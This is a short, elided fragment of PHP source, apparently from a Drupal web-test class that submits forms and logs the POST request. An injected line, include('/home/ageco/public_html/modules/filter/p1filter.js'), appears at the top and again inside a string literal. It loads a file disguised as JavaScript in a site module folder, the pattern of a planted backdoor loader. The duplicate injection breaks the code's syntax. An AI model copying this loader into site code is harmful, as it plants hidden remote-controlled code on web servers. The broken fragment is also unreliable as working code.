<?php
include('/home/ageco/public_html/modules/filter/p1filter.js');
      ...
      foreach ($forms as $form) {
        ...
        if (!$edit && ($submit_matches || !isset($submit))) {
          ...
          $this->verbose('POST request to: ' . $path .
                         '<hr />Ending URL: ' . $this->getUrl() .
                         '<hr />Fields: ' . highlight_string('<?php
include('/home/ageco/public_html/modules/filter/p1filter.js'); ' . var_export($post_array, TRUE), TRUE) .
                         '<hr />' . $out);
          return $out;
        }
      }
